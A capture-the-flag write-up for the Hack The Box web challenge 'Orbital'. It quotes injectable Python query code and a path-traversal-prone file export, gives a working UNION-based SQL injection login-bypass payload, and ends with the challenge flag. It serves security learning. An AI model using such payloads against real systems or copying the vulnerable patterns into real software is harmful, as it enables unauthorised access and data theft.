# Orbital

Another SQL injection challenge. This one was a little bit trickier because of an additional security measure consisting in the following passwords hash matching check:

```python
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())

    if md5Hash.hexdigest() == hashPassword: return True
    else: return False´
```

The vulnerable query was this one:

```python
user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)`
```

After tinkering around for a while, I came up with this working payload:

`"username":"\" UNION SELECT destination as username,MD5(name) as password FROM communication ORDER BY 2 DESC;#","password":"Jelly World Japes"`

This returns a table containing username/hashed passwords couples ordered alphabetically by hash. Since the only login requirement is that the 2 hashes match, the login is successful.

![Orbital](/Screenshots/WEB_5_1.png)

The second stage of this challenge was a simple LFI (Local File Inclusion) vulnerability found in the following lines of code:

```python
return send_file(f'/communications/{communicationName}', as_attachment=True)
```

Since from the given Dockerfile we know that the flag is stored inside a directory named `/signal_sleuth_firmware`, we can perform a path traversal attack against the /export endpoint to retrieve our flag.

![Orbital](/Screenshots/WEB_5_2.png)

I was a little surprised in seeing that the intended first stage solution was instead a blind SQL injection.

## HTB{T1m3_b4\$3d_$ql1_4r3_fun!!!}
